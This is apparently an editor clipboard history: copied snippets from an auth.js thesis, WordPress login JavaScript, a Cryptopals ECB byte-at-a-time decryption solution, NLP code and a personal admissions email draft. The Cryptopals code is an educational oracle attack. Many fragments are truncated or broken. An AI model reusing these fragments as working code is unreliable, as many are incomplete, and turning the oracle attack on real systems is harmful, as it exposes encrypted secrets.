	<script type = "text/javascript" src = "https://trusted.com/auth.js"></script>
	<script type = "text/javascript" src = "myjs.js"></script>
	...
	</head>
	<body>
	/* Registration and login form */
	</body>
	</html>
	\end{lstlisting}
afd5e4fc1c088e0d09552c4ceb938dc3|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|10|1|V|javascript
	    let message = jQuery("#csrf-token").val();
	    let credentials = authenticate(password, message);
01e09409ee09237a512ccdbcaf4fd9f9|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|79|5|V|tex
	    authenticate(username, password, serverAddress);
c850a1227af57056485a1e017cae1885|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|77|5|V|tex
	    let message = jQuery("#nonce").val();
fe01ce2a7fbac8fafaed7c982a04e229|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|77|44|v|tex
	demo
c0bf02ce85b64c746bba4791e7d74227|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/reset_pass.js|10|1|V|javascript
	    let public_key = register(password); //Generate the credential using auth.js
cfb857ab1aa183e43a7511950f88fe1e|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|73|5|V|tex
	    register(username, password, serverAddress);
70cc0753c05a2d5cf75b981c6fb053a0|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|73|42|v|tex
	//Generate the credential using auth.js
1432ab3d692440242a802425b6d303de|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|69|3|V|tex
	  /* Get username and password from html form */ 
5121b744ae4b51f2ac6d6b7af7782363|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/reset_pass.js|9|1|V|javascript
	    let password = jQuery("#pass1").val();
d139564caa1ac7ccbdec65b21b457625|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|78|19|v|tex
	document.getElementById("nonce");
9ee1f401b6a2a7c3048010fc558e6d28|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|69|53|v|tex
	jQuery("#pass1").val();
94d2914a4f5cd5c156e7de0e72b8e6a4|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|73|5|V|tex
	    /* Send credential to the server, along with other necessary information */
eba873c5084b5d44d2b9639e69ec9940|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|2|809|v|tex
	 For instance, the client no longer needs to rely on untrusted implementations of the cryptographic primitives implemented in JavaScript, since the browser itself executes them in a secure context.
cdabeff326ae61174223904f9a87d5bc|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|66|147|v|tex
	tweaks
fc849fe12a9a72f08c8433f2294bde7c|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/reset_pass.js|7|6|v|javascript
	passwordProccessMethod
1bc82b7535da5cd52cdbc258ef57a4bf|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|90|64|v|tex
	{\tt scrypt\_seed\_ed25519\_keypair
9e22dfc0a665c8fdb0ba7f82f6f9de7b|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|90|5|V|tex
	    \item Use the {\tt initializeCredentialType} call with the {\tt scrypt\_seed\_ed25519\_keypair} authentication scheme in both the log in and reset password forms.
410d98939d4116adb562b97046d2a3eb|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|95|284|v|tex
	submitted
627d3418ea0746571bb235a67bceb07c|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|95|351|v|tex
	typed 
260f601422224db73d7994f93f3c1a23|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|95|550|v|tex
	  Using this scheme, the reset password form script will change the typed password value to the Ed25519 public key generated using the password as a seed, using the {\tt register} API call of {\tt auth
ad681fb000d9827c14d51962903b2d15|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|99|160|^v|tex
	{\tt authjs\_authenticate} t
4245bec93c09641bd4417b21a0f7d4cf|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|99|160|^v|tex
	{\tt authjs\_authenticate} 
070df5ea2a18eef24cb9152aa98fdd06|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|99|642|^v|tex
	~\ref{lst:authjs_authenticate})
8e0b3f4080f6a3bebd56b6e4f42acd59|file:///tmp/neomutt-neo-1000-2637-9615946224665772319|3|1|V|mail
	I am one of the students who was admittedd
b5aa647d7b1684262c7cb1586ae3bf75|file:///tmp/neomutt-neo-1000-2637-9615946224665772319|3|1|V|mail
	I was offered admission for the PHD program in Brown University,
	beginning Fall 2020. Due to the recent circumstances regarding the
	COVID-19 pandemic, I was wondering if there is a possibility of an
	extension been given for the submission of our admission decision. Since
	it is unclear what the situation will be like for the following months,
	it would be extremely helpful if we had a few more weeks until we have
	to submit our final decision.
8b62ceabcca01045711662ed0dcb7004|file:///home/neo/cryptopals/set2/set2_sol.py|66|20|v|python
	random.randint(5,10)
93126bbff6815a8aa8a4da32e6263cea|file:///home/neo/cryptopals/set2/set2_sol.py|213|5|V|python
	    ecb_oracle()
8348279f61377151200fd51e312b3988|file:///home/neo/cryptopals/set2/set2_sol.py|96|7|V|python
	        print(prefix)
d9281bfadd049aad0c69353cff187157|file:///home/neo/cryptopals/set2/set2_sol.py|97|9|V|python
	        print(plaintext)
13d23e6341f9f6198f928be947a1abda|file:///home/neo/cryptopals/set2/set2_sol.py|208|1|V|python
	def ecb_decrypt_with_prefix():
c4c6d5e8f895968c5c0b895c5340ad6a|file:///home/neo/cryptopals/set2/set2_sol.py|129|1|V|python
	    if not isinstance(key, bytes) or not isinstance(encryption_function, Callable):
	        raise TypeError
bb21a480d3aa9fb53c7b65320b4f9712|file:///home/neo/cryptopals/set2/set2_sol.py|131|1|V|python
	    block_size = detect_block_size(key, encryption_function)
	    ciphertext = encryption_function(b'A' * 50, key)
	    ciphertext = codecs.encode(ciphertext, 'base64').decode('utf-8')
	    mode = detect_mode(bytes(ciphertext, 'utf-8'))
	    if mode != 'ECB':
	        raise Exception('Can only decrypt ECB mode')
	    encrypted_secret = encryption_function(b'', key)
	    encrypted_secret_len = len(encrypted_secret)
	    total_blocks = encrypted_secret_len // block_size # Find out how many block the encrypted secret is by itself
	    decrypted_text = b''
	    target_position = (total_blocks - 1) * block_size # We will be decrypting the block where our input ends
	    pre_appended_input = target_position * b'A' + b'A' * (block_size - 1) # Append A's and decrease each time we reveal a character 
	    for curr_block in range(total_blocks):
	        decrypted_block = b''
	        for i in range(block_size):
	            target = encryption_function(pre_appended_input, key)[target_position:target_position+ 16] # The block we want to match
	            for c in string.printable:
	                plaintext_pad = (target_position - (curr_block * 16)) * b'A' + b'A' * (block_size - 1 - i) + decrypted_text + decrypted_block + bytes(c, 'utf-8') # Same as target, except last character (brute force it)
	                output_block = encryption_function(plaintext_pad, key)[target_position:target_position+ 16]
	                if target == output_block: # Check if output matches target until we get the correct character
	                    decrypted_block += bytes(c, 'utf-8')
	                    break
	            pre_appended_input = pre_appended_input[:-1]
	        decrypted_text += decrypted_block
	    return decrypted_text
94abdcbf5ba21df72684653b4d3ba79f|file:///home/neo/cryptopals/set2/set2_sol.py|244|5|V|python
	    ecb_oracle(b"AA", key, True)
9cadd2c4ad5ba6927d562a934e52cf8c|file:///home/neo/cryptopals/set2/set2_sol.py|168|5|V|python
	    print(prepend)
ded942432d552ead4ffd3f4e11097cf7|file:///home/neo/cryptopals/set2/set2_sol.py|169|5|V|python
	    print(encrypted_secret)
21c9fe97baccfe6394360cf0361ba08d|file:///home/neo/cryptopals/set2/set2_sol.py|169|21|v|python
	encrypted_secret.decode('utf-8').find(indicator)
0a64bcb656ca6609b4b367e243dec230|file:///home/neo/cryptopals/set2/set2_sol.py|169|48|v|python
	indicator
0a38393d1fba95b8d2990db69ca93491|file:///home/neo/cryptopals/set2/set2_sol.py|170|11|v|python
	encrypted_secret
614ad870f7bb23a172685e55bf5be8e5|file:///home/neo/cryptopals/set2/set2_sol.py|169|62|V|python
	    encrypted_secret = encryption_function(prepend, key, True)
	    # print(encrypted_secret.decode('latin-1'))
085d830d44fe1f29b79f8f33a50f7d8a|file:///home/neo/cryptopals/set2/set2_sol.py|170|5|V|python
	    # print(encrypted_secret.decode('latin-1'))
9bdc78a5aa0269994d4b767bc72c9033|file:///home/neo/cryptopals/set2/set2_sol.py|167|5|V|python
	    # print(indicator.decode('latin-1'))
0fbac19db23b3e62a3b8e515461e4cf9|file:///home/neo/cryptopals/set2/set2_sol.py|248|17|v|python
	ecb_decrypt_with_prefix(key, ecb_oracle)
0c10a31ab06f5c53cab75e2918fd9246|file:///home/neo/cryptopals/set2/set2_sol.py|62|1|V|python
	def encryption_oracle(plaintext: bytes) -> bytes:
9804e2988e55f0ce97e119faaa538cc5|file:///home/neo/cryptopals/set2/set2_sol.py|172|5|V|python
	    print(indicator_pos)
2029ace50a61dc93ed09cff2692b19e1|file:///home/neo/cryptopals/set2/set2_sol.py|175|5|V|python
	    print(plaintext_start_block)
865358376a1a767fa2e6388c9bb7bdb4|file:///home/neo/cryptopals/set2/set2_sol.py|95|5|V|python
	        print(prefix_len)
27e999696d6841468e3ab8957c52dd73|file:///home/neo/cryptopals/set2/set2_sol.py|172|29|v|python
	encrypted_secret[indicator_pos + 2 * block_size:]
913d0c579fad86986434519a4735a817|file:///home/neo/cryptopals/set2/set2_sol.py|169|24|v|python
	encryption_function(prepend, key, True)
4990dbbc1bcbe8f2b5bbc9843db9cd87|file:///home/neo/cryptopals/set2/set2_sol.py|167|5|V|python
	    print(indicator)
558d67d045fafe00dd6c82ea1dfa5b8e|file:///home/neo/cryptopals/set2/set2_sol.py|172|5|V|python
	    controlled_enc = encrypt_aes
5b8e543a49c6fc8761c2bfc69e2263a3|file:///home/neo/cryptopals/set2/set2_sol.py|171|1|V|python
	    first_fully_controlled = encrypted_secret[indicator_pos + block_size: indicator_pos + 2 * block_size]
	    for i in range(block_size):
	        test_block = encrypt_aes_ecb(b'B'*i + b'A'*(block_size - i), key)
	        if test_block == first_fully_controlled:
	            print(test_block)
2a79ead4946925fe2d3ea4787ce7ebba|file:///home/neo/cryptopals/set2/set2_sol.py|176|74|v|python
	 # Append A's and decrease each time we reveal a character 
6dd52fffcb1d0aae4bacd098e5be6653|file:///home/neo/cryptopals/set2/set2_sol.py|175|54|v|python
	 # We will be decrypting the block where our input ends
74260e1191c6bc1a1d0217872695b019|file:///home/neo/cryptopals/set2/set2_sol.py|173|55|v|python
	 # Find out how many blocks the encrypted secret is by itself
b562f8b9911d6a1bbd4e06f13b9e5827|file:///home/neo/cryptopals/set2/set2_sol.py|181|42|v|python
	b'B'*i + b'A'*(block_size - i
c9eb5316b8d4628844bed3bd83ce20e5|file:///home/neo/cryptopals/set2/set2_sol.py|178|1|V|python
	        first_fully_controlled = encrypted_secret[indicator_pos + block_size: indicator_pos + 2 * block_size]
	        for i in range(block_size):
	            test_block = b'B'*i + b'A'*(block_size - i)
	            test_block_enc = encrypt_aes_ecb(test_block, key)
	            if test_block_enc == first_fully_controlled:
	                print(test_block)
3e87c3d85f7dc33383452af2c6923967|file:///home/neo/cryptopals/set2/set2_sol.py|180|85|v|python
	[indicator_pos + block_size:]
f2c3cb1db6f47fd61057b5d78e36cf5a|file:///home/neo/cryptopals/set2/set2_sol.py|166|1|V|python
	    indicator = encrypt_aes_ecb(b'B' * block_size, key)
	    prepend = b'B' * (2 * block_size - 1)
	    encrypted_secret = encryption_function(prepend, key, True)
	    indicator_pos = encrypted_secret.decode('latin-1').find(indicator.decode('latin-1'))
79656ac549533d2b1210161e27ea5d92|file:///home/neo/cryptopals/set2/set2_sol.py|184|13|V|python
	            encrypted = encryption_function(prepend + pre_appended_input, key, True)[indicator_pos + block_size:]
8ffc19cc28d7298f609f40f6da73143d|file:///home/neo/cryptopals/set2/set2_sol.py|184|13|V|python
	            encrypted_sliced = encrypted_secret[]
70676371d0a2d19a6d7e48ad7d35a7d8|file:///home/neo/cryptopals/set2/set2_sol.py|180|13|V|python
	            indicator = encrypt_aes_ecb(b'B' * block_size, key)
77f1ee572f95cc0a3db93a29d17e4e45|file:///home/neo/cryptopals/set2/set2_sol.py|188|21|V|python
	                    print(test_block_enc)
73d8a883c6cddf748f2b90527450bd90|file:///home/neo/cryptopals/set2/set2_sol.py|188|21|V|python
	                    print(first_fully_controlled)
08167696138abfb1a712d097cf4cfb4b|file:///home/neo/cryptopals/set2/set2_sol.py|189|21|v|python
	print(test_block)
2af6a233b5955e03ecb88a2ffda8a36b|file:///home/neo/cryptopals/set2/set2_sol.py|190|5|V|python
	    #         print(encrypted)
084abdb235bdfd8cc3e05b0507985294|file:///home/neo/cryptopals/set2/set2_sol.py|184|13|V|python
	            # first_fully_controlled = encrypted_secret[indicator_pos + block_size: indicator_pos + 2 * block_size]
c506ff134babdd6e68ab3e6350e95305|file:///home/neo/cryptopals/set2/set2_sol.py|89|54|v|python
	bool
db53db5bf31edda851008d9bcdd68bc8|file:///home/neo/cryptopals/set2/set2_sol.py|93|1|V|python
	    if add_prefix:
	        prefix_len = random.randint(5,30)
	        prefix = generate_random_bytes(prefix_len)
	        plaintext = prefix + plaintext
00c63e3db1fd32cc69f7c761a9dd6414|file:///home/neo/cryptopals/set2/set2_sol.py|96|1|V|python
	        prefix_len = random.randint(5,30)
	        prefix = generate_random_bytes(prefix_len)
648c9287a5dbc39636c3c1a3204e2ebb|file:///home/neo/cryptopals/set2/set2_sol.py|7|1|V|python
	ecb_prefix = 
5b0faa4594e38558c532f1805190d471|file:///home/neo/cryptopals/set2/set2_sol.py|97|9|V|python
	        prefix_len = random.randint(5,30)
02627193a2919078d669a75544a4236a|file:///home/neo/cryptopals/set2/set2_sol.py|97|9|V|python
	        prefix = generate_random_bytes(prefix_len)
3046c9e751275ae9bfab60f928bb3f04|file:///home/neo/cryptopals/set2/set2_sol.py|7|1|V|python
	prefix_len = random.randint(5,30)
	ecb_prefix = generate_random_bytes(prefix_len)
0b551c7a1dc00abb4fef65a30445cfa6|file:///home/neo/cryptopals/set2/set2_sol.py|257|1|V|python
	    prefix_len
4440288051918b2bd8288f60b742b784|file:///home/neo/cryptopals/set2/set2_sol.py|176|21|V|python
	            offset = 0
	            prepend = b'B' * (2 * block_size - 1)
	            encrypted_secret = encryption_function(prepend + pre_appended_input, key, prefix)
	            indicator_pos = encrypted_secret.decode('latin-1').find(indicator.decode('latin-1'))
	            controlled_start = encrypted_secret[indicator_pos + block_size:]
	            first_fully_controlled = controlled_start[:block_size]
	            for i in range(block_size):
	                test_block = b'B'*i + b'A'*(block_size - i)
	                test_block_enc = encrypt_aes_ecb(test_block, key)
	                if test_block_enc == first_fully_controlled:
	                    offset = i
	                    print(test_block)
2e4dfbf821a7b93400380186b8dc81f5|file:///home/neo/cryptopals/set2/set2_sol.py|164|5|V|python
	    encr = encryption_function(prepend, key, prefix)
b26354de92e5cebeb3b3cc51a953c306|file:///home/neo/cryptopals/set2/set2_sol.py|182|1|V|python
	    # indicator_pos = encrypted_secret.decode('latin-1').find(indicator.decode('latin-1'))
2089661eb3468e0c6e4375422d3f1ad1|file:///home/neo/cryptopals/set2/set2_sol.py|168|5|v|python
	encr.decode('latin-1').find(indicator)
a5d58046291c3da6d401aad7dbe90eb3|file:///home/neo/cryptopals/set2/set2_sol.py|168|9|V|python
	        print(matched)
d12a2332c0548905625719e584701d0d|file:///home/neo/cryptopals/set2/set2_sol.py|168|9|V|python
	        if matched == -1:
73d808003f59e4aef249bd7e58258d80|file:///home/neo/cryptopals/set2/set2_sol.py|166|11|v|python
	matched
5cd843c4a11d8367deaaa981702ab34e|file:///home/neo/cryptopals/set2/set2_sol.py|164|5|V|python
	    matched = -1
296b5b12688a16fc2251d2ac162b151c|file:///home/neo/cryptopals/set2/set2_sol.py|171|1|V|python
	    # prepend = b'B' * (2 * block_size - 1)
3484f7d9c2e9d7fa5c7917ce8adb1c22|file:///home/neo/cryptopals/set2/set2_sol.py|171|5|V|python
	    # encrypted_secret = encryption_function(prepend, key, prefix)
bac66c1d1b25948523c1753e86b357ce|file:///home/neo/cryptopals/set2/set2_sol.py|133|1|V|python
	    encrypted_secret = encryption_function(b'', key)
	    encrypted_secret_len = len(encrypted_secret)
	    total_blocks = encrypted_secret_len // block_size # Find out how many block the encrypted secret is by itself
	    decrypted_text = b''
	    target_position = (total_blocks - 1) * block_size # We will be decrypting the block where our input ends
	    pre_appended_input = target_position * b'A' + b'A' * (block_size - 1) # Append A's and decrease each time we reveal a character 
	    for curr_block in range(total_blocks):
	        decrypted_block = b''
	        for i in range(block_size):
	            target = encryption_function(pre_appended_input, key)[target_position:target_position+ 16] # The block we want to match
	            for c in string.printable:
	                plaintext_pad = (target_position - (curr_block * 16)) * b'A' + b'A' * (block_size - 1 - i) + decrypted_text + decrypted_block + bytes(c, 'utf-8') # Same as target, except last character (brute force it)
	                output_block = encryption_function(plaintext_pad, key)[target_position:target_position+ 16]
	                if target == output_block: # Check if output matches target until we get the correct character
	                    decrypted_block += bytes(c, 'utf-8')
	                    break
	            pre_appended_input = pre_appended_input[:-1]
	        decrypted_text += decrypted_block
	    return decrypted_text
	
8f53dc86d96a834537192a27e54a3ab8|file:///home/neo/cryptopals/set2/set2_sol.py|171|5|V|python
	    encrypted_secret = encryption_function(b'', key)
b890677a987eb729fd90f03ff1beb959|file:///home/neo/cryptopals/set2/set2_sol.py|166|1|V|python
	        encr = encryption_function(prepend, key, prefix)
2122f563d72dfd9645807f732e7e7c5a|file:///home/neo/cryptopals/set2/set2_sol.py|166|16|v|python
	encryption_function(prepend, key, prefix)
fa48bd1fc52a72fa8e79b82b44e76811|file:///home/neo/cryptopals/set2/set2_sol.py|173|5|V|python
	    print(encrypted_secret_len)
210ac9c7d7e853b071c512c70ed3a95f|file:///home/neo/cryptopals/set2/set2_sol.py|184|17|V|python
	                o
f51cc2face409fdc1ac306bbe9dc5b32|file:///home/neo/cryptopals/set2/set2_sol.py|179|1|V|python
	            encrypted_text = encryption_function(prepend, key, prefix)[plaintext_start:]
d37339c55822dc4b7e9d122c3b4f025a|file:///home/neo/cryptopals/set2/set2_sol.py|184|17|v|python
	encrypted_text
ce817b8ca0e01f02b7c6de810861d6b8|file:///home/neo/cryptopals/set2/set2_sol.py|185|32|v|python
	encryption_function(plaintext_pad, key)
67e583b1e62d699d84ae6db4aa9aa627|file:///home/neo/cryptopals/set2/set2_sol.py|184|46|v|python
	prepend
811f1d94980adebc6ab1e8913b07234d|file:///home/neo/cryptopals/set2/set2_sol.py|284|5|V|python
	    ecb_decrypt_with_prefix(key, ecb_oracle, prefix)
f5d3ff51486804e88434612329a3cbea|file:///home/neo/cryptopals/set2/set2_sol.py|193|1|V|python
	    # plaintext_start_block = encrypted_secret[indicator_pos + 2 * block_size:]
	    # indicator = encrypt_aes_ecb(b'B' * block_size, key)
	    # encrypted_and_pad_len = len(plaintext_start_block)
	    # total_blocks = encrypted_and_pad_len // block_size
	    # decrypted_text = b''
	    # target_position = (total_blocks - 1) * block_size
	    # pre_appended_input = target_position * b'A' + b'A' * (block_size - 1)
	    # offset = 0
	    # prepend = b'B' * (2 * block_size - 1)
	    # encrypted_secret = encryption_function(prepend + pre_appended_input, key, prefix)
	    # indicator_pos = encrypted_secret.decode('latin-1').find(indicator.decode('latin-1'))
	    # controlled_start = encrypted_secret[indicator_pos + block_size:]
	    # first_fully_controlled = controlled_start[:block_size]
	    # for i in range(block_size):
	    #     test_block = b'B'*i + b'A'*(block_size - i)
	    #     test_block_enc = encrypt_aes_ecb(test_block, key)
	    #     if test_block_enc == first_fully_controlled:
	    #         offset = i
	    #         print(test_block)
	    # for curr_block in range(total_blocks):
	    #     decrypted_block = b''
	    #     for i in range(block_size):
	    #         target = controlled_start[target_position:target_position+ 16] # The block we want to match
	    #         for c in string.printable:
	    #             plaintext_pad = offset * b'B' + (target_position - (curr_block * 16)) * b'A' + b'A' * (block_size - 1 - i) + decrypted_text + decrypted_block + bytes(c, 'utf-8') # Same as target, except last character (brute force it)
	    #             output_block = encryption_function(plaintext_pad, key, True)[target_position:target_position+ 16]
	    #             if target == output_block: # Check if output matches target until we get the correct character
	    #                 decrypted_block += bytes(c, 'utf-8')
	    #                 break
	    #         pre_appended_input = pre_appended_input[:-1]
	    #     decrypted_text += decrypted_block
	    # return decrypted_text
	
3793e4fc54500ee335d9a6533df8375c|file:///home/neo/cryptopals/set2/set2_sol.py|253|1|V|python
	    # decrypted = ecb_decrypt_with_prefix(key, ecb_oracle, prefix)
8ba9843e73cfcbd9774e87b1deca0ee7|file:///home/neo/cryptopals/set2/set2_sol.py|272|5|V|python
	    # decrypted = ecb_decrypt_byte_at_a_time(key, ecb_oracle)
576857f997de3abbdfb7120960e6cba8|file:///home/neo/cryptopals/set2/set2_sol.py|124|1|V|python
	def ecb_decrypt_byte_at_a_time(key: bytes, encryption_function: Callable) -> bytes:
	    if not isinstance(key, bytes) or not isinstance(encryption_function, Callable):
	        raise TypeError
	    block_size = detect_block_size(key, encryption_function)
	    ciphertext = encryption_function(b'A' * 50, key)
	    ciphertext = codecs.encode(ciphertext, 'base64').decode('utf-8')
	    mode = detect_mode(bytes(ciphertext, 'utf-8'))
	    if mode != 'ECB':
	        raise Exception('Can only decrypt ECB mode')
	    encrypted_secret = encryption_function(b'', key)
	    encrypted_secret_len = len(encrypted_secret)
	    total_blocks = encrypted_secret_len // block_size # Find out how many block the encrypted secret is by itself
	    decrypted_text = b''
	    target_position = (total_blocks - 1) * block_size # We will be decrypting the block where our input ends
	    pre_appended_input = target_position * b'A' + b'A' * (block_size - 1) # Append A's and decrease each time we reveal a character 
	    for curr_block in range(total_blocks):
	        decrypted_block = b''
	        for i in range(block_size):
	            target = encryption_function(pre_appended_input, key)[target_position:target_position+ 16] # The block we want to match
	            for c in string.printable:
	                plaintext_pad = (target_position - (curr_block * 16)) * b'A' + b'A' * (block_size - 1 - i) + decrypted_text + decrypted_block + bytes(c, 'utf-8') # Same as target, except last character (brute force it)
	                output_block = encryption_function(plaintext_pad, key)[target_position:target_position+ 16]
	                if target == output_block: # Check if output matches target until we get the correct character
	                    decrypted_block += bytes(c, 'utf-8')
	                    break
	            pre_appended_input = pre_appended_input[:-1]
	        decrypted_text += decrypted_block
	    return decrypted_text
	
252a07a6e0be456cb1cd043d522c4a07|file:///home/neo/cryptopals/set2/set2_sol.py|146|40|v|python
	 + block_size
1dbaeb68b2dda396a38f5be428ce86ed|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|11|1|V|bib
	@misc{keybase,
	  title = {Keybase.io},
	  howpublished = {\url{https://keybase.io/}}
	}
4d2ba1455937e7a94508fc61284f24b1|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|5|20|v|bib
	docs/api/1.0/call/signup
4aaa1b174fbac43bda602507f950a323|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|2|1|V|bib
	@misc{keybase-signup,
	  title = {Keybase.io signup},
	  howpublished = {\url{https://keybase.io/docs/api/1.0/call/signup}}
	}
7553ab52bc1b20bac00f7163f4ecacb1|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|1|V|bib
	https://keybase.io/docs/api/1.0/call/login
db12691ebd8c53cf38b259cef25f3923|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|22|688|v|tex
	{\tt scrypt\_seed\_ed25519\_keypair} scheme, the library will use the implemented 
1e2ec93a446772279acee6ab08cd4ee7|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|24|172|v|tex
	 described in Section~\ref{sec:implementation}
83ce9f2c0048e09269d644f47414b992|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|39|757|v|tex
	, which uses the authentication scheme described in Section~\ref{sec:implementation}
b3bcf44b6236b452647718aec79f9d6f|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|11|1|V|python
	nltk.download('stopwords')
09f3f271a814d2cd3c4753971a610601|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|15|37|v|python
	word_tokens
c40d9a3c0f90d7dc9564f3b923736209|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|15|1|V|python
	preprocessed_train_df = [w for w in train_tokens if not w in stop_words] 
b6e544a0163c327887e1351cceb99a8d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|16|36|v|python
	train_tokens
ed6ab1fdf2b9f1def724d14014021da9|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|18|1|V|python
	train_df[train_df["target"] == 0]["text"].values[1]
	train_df[train_df["target"] == 1]["text"].values[1]
650919decdf396ba80c465bef1d8325f|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|17|41|V|python
	# preprocessed_train_df[preprocessed_train_df["target"] == 0]["text"].values[1]
	# preprocessed_train_df[preprocessed_train_df["target"] == 1]["text"].values[1]
0f566f7a57255073351499ac576b14c3|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|19|33|V|python
	print(train_df[train_df["target"] == 0]["text"].values[1])
	print(train_df[train_df["target"] == 1]["text"].values[1])
06b768f4a76b6edc66cdfc5489b63b94|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|12|1|V|python
	print(train_df["text"].values[100])
a12428e1ded0a377b668d4a868919ec0|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|20|1|V|python
	print(pre)
94176f0eaa787a5f7b14ba66bc0749dd|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|20|1|V|python
	print(train_tokens)
91017eba202b22a1a1b272426426ed51|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|17|5|V|python
	    print(str(sentence))
543216082b14ef18fed49bad278c3336|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|18|27|V|python
	# train_tokens = word_tokenize(str(train_df["text"]))
	# test_tokens = word_tokenize(str(test_df["text"]))
0b01df763d72fc2321ac576e14419fc6|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|18|1|V|python
	for sentence in train_tokens:
	    print(sentence)
d01e47af9c369f070f50e6fcea5dd1f3|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|14|1|V|python
	# Cast it to str because for some reason it wouldn't recognize it as a string
7613d97aba9a7a0e93242e50b0a7f7ef|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|14|1|V|python
	train_tokens = []
	for sentence in train_df["text"]:
	    train_tokens.append(sentence.split(' '))
2ada682bd6162d6c14a6344b6a451b1a|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|26|5|v|python
	train_df["text"].values[i] = 
87c00f36ce3cec0953cbaac9b3c01b0f|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|25|1|V|python
	for sentence in train_df["text"]:
bd3a19aafd215d1e07fad4a1e6161f83|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|30|5|V|python
	    print(sentence)
1e2e5d60230c5b30cf41ad1e37665862|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|25|82|V|python
	# preprocessed_train_sentences = [w for w in train_tokens if not w in stop_words] 
	# preprocessed_test_sentences = [w for w in test_tokens if not w in stop_words] 
9968351e8e57987d4999083319248744|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|24|1|V|python
	    train_remove_stopwords.append([word for word in train_tokens if not word in stop_words])
bdbd1cfc3f1924500caddd98e7310f49|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|25|5|V|python
	    # train_remove_stopwords.append([word for word in sentence if not word in stop_words])
1421693492c71a91e3f5f500e161eda3|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|26|1|V|python
	for sentence in train_remove_stopwords:
	    print(sentence)
2a27197c4a47d021e2541020ac5b6e6d|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|14|18|V|python
	train_tokens = []
	for sentence in train_df["text"]:
	    train_tokens.append(' '.join(sentence.split(' ')))
	
	test_tokens = []
	for sentence in test_df["text"]:
	    test_tokens.append(' '.join(sentence.split(' ')))
	
	print(train_tokens[0])
476bca1c107bb4ddda8b105f15a664bd|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|18|1|V|python
	print(train_remove_stopwords[1])
68ae1b856b72127bd25d1ccec62b720e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|18|1|V|python
	for i in range(5):
	    print(train_df["text"].values[i])
	    print(train_remove_stopwords[i])
0e4488f23689ae0b8d4a095602e6a940|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|14|1|V|python
	train_remove_stopwords = []
	for i, sentence in enumerate(train_df["text"]):
	    train_remove_stopwords.append([word for word in sentence.split(' ') if not word in stop_words])
aa0ab5b4f86889b9024a6eab37889429|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|24|1|V|python
	# for sentence in train_df["text"]:
	#     print(sentence)
	
	# for i, value in enumerate(train_df["text"]):
	#     print(value)
51c9a68e41dfe98eec56dbf0fb53f3bb|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|21|1|V|python
	for i, _ in enumerate(train_df["text"]):
	    train_df["text"].values[i] = train_remove_stopwords[i]
56459dedae88b978f74d6973c41e9ab7|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|27|1|V|python
	    print(train_df["text"].values[i])
659d762df32f559dee1d0999b5f05b53|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|26|1|V|python
	for i in range(5):
	    print(train_df["text"].values[i])
cc339836350627186722e5fddfb4c1c7|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|6|1|V|python
	from nltk.tokenize import word_tokenize
7ea6ec3d756e85b68340642b8425c7b3|untitled:1|1|1|v|
	MyFunction(
25fbf7f7f1c1a02058787307a881081b|untitled:1|1|1|v|
	MyFunction("
50eefe187304bef16437902006b5a6b1|file:///home/neo/test|1|1|V|
	MyFunction("test")
f1fba9ac4e0ab171803fa69885be583e|file:///home/neo/test|3|3|V|
	    p
